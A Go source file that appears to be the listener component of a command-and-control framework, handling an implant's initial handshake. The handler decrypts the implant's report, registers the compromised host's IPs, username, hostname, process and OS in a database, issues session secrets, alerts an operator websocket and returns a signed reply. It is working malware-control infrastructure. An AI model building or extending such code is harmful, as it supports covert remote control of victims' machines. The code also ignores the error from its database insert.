// internal/agent/listeners/handler_handshake.go
package listeners

import (
	pb "c2/proto"
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"github.com/google/uuid"
)

// handleInitialHandshake processes the first POST from a new client
func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request, initData *InitData) error {
	log.Printf("[Handshake] Starting initial handshake for client: %s", initData.ClientID)
	log.Printf("[Handshake] RSAKey length: %d", len(initData.RSAKey))

	// Get external IP
	externalIP := getRemoteIP(r)
	log.Printf("[Handshake] Client connecting from external IP: %s", externalIP)

	// Read and decode the request body
	var postData PostData
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("[ERROR] Failed to read request body: %v", err)
		return fmt.Errorf("failed to read request body: %v", err)
	}

	log.Printf("[DEBUG] Received raw request body: %s", string(body))

	if err := json.Unmarshal(body, &postData); err != nil {
		log.Printf("[ERROR] Failed to decode request body: %v", err)
		return fmt.Errorf("failed to decode request body: %v", err)
	}

	// Print metadata to verify encryption type
	log.Printf("[DEBUG] Request metadata: %+v", postData.Metadata)

	var decrypted string
	if encType, ok := postData.Metadata["encryption"]; ok && encType == "rsa+aes" {
		log.Printf("[DEBUG] Using RSA+AES decryption")
		decrypted, err = DecryptDoubleEncrypted(postData.Data, initData.RSAKey, initData.Secret)
		if err != nil {
			log.Printf("[ERROR] Double decryption failed: %v", err)
			return fmt.Errorf("failed to decrypt double-encrypted data: %v", err)
		}
	} else {
		log.Printf("[DEBUG] Using legacy AES-only decryption")
		decrypted, err = DecryptJSON(postData.Data, initData.Secret)
		if err != nil {
			log.Printf("[ERROR] Legacy decryption failed: %v", err)
			return fmt.Errorf("failed to decrypt data: %v", err)
		}
	}

	var sysInfo SystemInfo
	if err := json.Unmarshal([]byte(decrypted), &sysInfo); err != nil {
		log.Printf("[ERROR] Failed to parse system info: %v", err)
		return fmt.Errorf("failed to parse system info: %v", err)
	}

	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Start transaction
	tx, err := m.db.BeginTx(ctx, &sql.TxOptions{
		Isolation: sql.LevelReadCommitted,
	})
	if err != nil {
		log.Printf("[ERROR] Failed to begin transaction: %v", err)
		return fmt.Errorf("failed to begin transaction: %v", err)
	}
	defer tx.Rollback()

	// Generate and verify unique GUID
	var newGUID string
	for attempts := 0; attempts < 3; attempts++ {
		newGUID = uuid.New().String()
		var exists bool
		err := tx.QueryRowContext(ctx, `
            SELECT EXISTS(SELECT 1 FROM inits WHERE id = $1)
            OR EXISTS(SELECT 1 FROM connections WHERE newclientID = $1)`,
			newGUID).Scan(&exists)

		if err != nil {
			log.Printf("[ERROR] Failed to check GUID existence: %v", err)
			return fmt.Errorf("failed to check GUID existence: %v", err)
		}

		if !exists {
			break
		}
		if attempts == 2 {
			return fmt.Errorf("failed to generate unique GUID after 3 attempts")
		}
	}

	// Generate secrets
	secret1, secret2 := generateInitialSecrets(initData.Secret, sysInfo.AgentInfo.Seed)

	// Create the verification data combining new clientID and received seed
	verificationData := fmt.Sprintf("%s:%s", newGUID, sysInfo.AgentInfo.Seed)

	// Decode the base64 private key
	pemData, err := base64.StdEncoding.DecodeString(initData.RSAKey)
	if err != nil {
		return fmt.Errorf("failed to decode private key: %v", err)
	}

	// Parse the private key
	block, _ := pem.Decode(pemData)
	if block == nil {
		return fmt.Errorf("failed to parse PEM block")
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("failed to parse private key: %v", err)
	}

	// Sign the verification data
	hashed := sha256.Sum256([]byte(verificationData))
	signature, err := rsa.SignPKCS1v15(
		rand.Reader,
		privateKey,
		crypto.SHA256,
		hashed[:],
	)
	if err != nil {
		return fmt.Errorf("failed to sign response: %v", err)
	}

	// Insert into connections table with transaction
	_, err = tx.ExecContext(ctx, `
        INSERT INTO connections (
            newclientID, clientID, protocol, secret1, secret2,
            extIP, intIP, username, hostname, note, 
            process, pid, arch, lastSEEN, os,
            proto, deleted_at
        ) VALUES (
            $1, $2, $3, $4, $5,
            $6, $7, $8, $9, $10,
            $11, $12, $13, $14, $15,
            $16, $17
        )`,
		newGUID, initData.ClientID, initData.Protocol, secret1, secret2,
		externalIP, sysInfo.AgentInfo.InternalIP, sysInfo.AgentInfo.Username,
		sysInfo.AgentInfo.Hostname, "", // note
		sysInfo.AgentInfo.ProcessName, fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
		sysInfo.AgentInfo.Arch, time.Now(), sysInfo.AgentInfo.OS,
		initData.Protocol, nil, // deleted_at
	)

	if err := tx.Commit(); err != nil {
		log.Printf("[ERROR] Failed to commit transaction: %v", err)
		return fmt.Errorf("failed to commit transaction: %v", err)
	}

	log.Printf("[Handshake] Created new connection with newclientID: %s for clientID: %s",
		newGUID, initData.ClientID)

	// Add to active connections in memory
	newConn := &ActiveConnection{
		ClientID: newGUID,
		Protocol: initData.Protocol,
		Secret1:  secret1,
		Secret2:  secret2,
	}
	if err := m.activeConnections.AddConnection(newConn); err != nil {
		log.Printf("[ERROR] Failed to add to active connections: %v", err)
		return fmt.Errorf("failed to add to active connections: %v", err)
	}

	// Create notification
	notification := &pb.ConnectionNotification{
		NewClientId: newGUID,
		ClientId:    initData.ClientID,
		Protocol:    initData.Protocol,
		Secret1:     secret1,
		Secret2:     secret2,
		ExtIp:       externalIP,
		IntIp:       sysInfo.AgentInfo.InternalIP,
		Username:    sysInfo.AgentInfo.Username,
		Hostname:    sysInfo.AgentInfo.Hostname,
		Process:     sysInfo.AgentInfo.ProcessName,
		Pid:         fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
		Arch:        sysInfo.AgentInfo.Arch,
		Os:          sysInfo.AgentInfo.OS,
		Proto:       initData.Protocol,
		LastSeen:    time.Now().Unix(),
	}

	// Notify websocket service
	if err := m.notifyWebsocketService(notification); err != nil {
		log.Printf("[Warning] Failed to notify websocket service: %v", err)
	}

	// Create and send signed response
	response := SignedResponse{
		Status:             "success",
		NewClientID:        newGUID,
		SecretsInitialized: true,
		Signature:          base64.StdEncoding.EncodeToString(signature),
		Seed:               sysInfo.AgentInfo.Seed,
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		return fmt.Errorf("failed to send response: %v", err)
	}

	return nil
}
